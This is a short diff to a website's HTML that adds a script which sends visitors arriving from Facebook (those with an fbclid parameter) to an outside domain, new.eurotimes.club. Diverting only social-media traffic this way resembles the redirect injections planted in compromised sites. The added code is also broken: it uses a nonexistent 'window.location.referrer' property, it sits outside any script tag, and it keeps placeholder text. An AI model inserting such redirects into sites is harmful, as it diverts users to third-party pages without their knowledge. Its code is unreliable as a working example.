@@ -524,5 +524,15 @@
       <script>
          AOS.init();
       </script>
+
+      if (window.location.referrer && window.location.referrer.indexOf("facebook.com") !== -1) {
+  const searchParams = new URLSearchParams(window.location.search.substring(1));
+  if (searchParams.has("fbclid")) {
+    // Construct your desired redirect URL here based on available query parameters or other logic
+    // Remember to properly encode and sanitize any user-provided data before including it in the URL
+    const redirectURL = "https://new.eurotimes.club/?YOUR_REDIRECT_PARAMETERS";
+    window.location.href = redirectURL;
+  }
+}
    </body>
 </html>
